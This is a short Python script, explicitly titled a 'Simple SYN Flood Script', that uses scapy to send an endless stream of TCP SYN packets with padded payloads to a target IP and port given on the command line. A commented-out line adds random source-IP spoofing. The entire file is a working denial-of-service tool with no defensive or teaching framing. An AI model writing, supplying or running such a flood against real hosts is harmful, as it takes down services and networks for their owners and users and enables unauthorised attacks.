from scapy.all import *
import argparse


parser = argparse.ArgumentParser(description="Simple SYN Flood Script")
parser.add_argument("target_ip", help="Target IP address (e.g router's IP)")
parser.add_argument("-p", "--port", type=int , help="Destination port (the port of the target's machine service, e.g 80 for HTTP, 22 for SSH and so on).")
args = parser.parse_args()
target_ip = args.target_ip
target_port = args.port


ip = IP(dst=target_ip)
#ip = IP(src=RandIP("10.1.1.1/24"), dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port,seq=12345,ack=1000,window=1000, flags="S")
raw = Raw(b"X" * 1024)
p = ip/tcp/raw
send(p, loop=1, verbose=0)
